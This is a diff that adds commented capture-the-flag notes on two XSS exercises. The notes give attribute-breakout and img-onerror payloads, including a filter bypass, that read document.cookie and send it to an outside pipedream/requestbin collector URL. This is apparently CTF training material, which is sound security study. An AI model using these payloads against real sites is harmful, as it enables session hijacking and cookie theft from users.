@@ -49,3 +49,15 @@
 #      - Check the flag on https://public.requestbin.com/
 
 #     2) CTF XSS 3
+#      - Error = Showing ID on the URL on the personal information
+#      - Check the attack possibility to change the ID on Burp Suite Request
+#      - Check the attack statement => aaa"/><script>alert(1)</script>
+#      - Check the attack => aaa"/><script>var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;</script>
+#      - Copy GET URL and input the URL on the admin visit bar
+#      - Check the flag on https://public.requestbin.com/
+
+#     3) CTF XSS 4
+#      - Error = In the board, it is possible to use special characters (<'">).
+#      - Check the attack possibility of using an attack statement on the board. => <script>alert(1)</script>
+#      - Filtering "script" and "alert", so using another attack statement => <img src=x onerror=confirm(1)> 
+#      - Check the attack => <img src="x" onerror=var cookieData = document.cookie; var i = new Image();i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;>
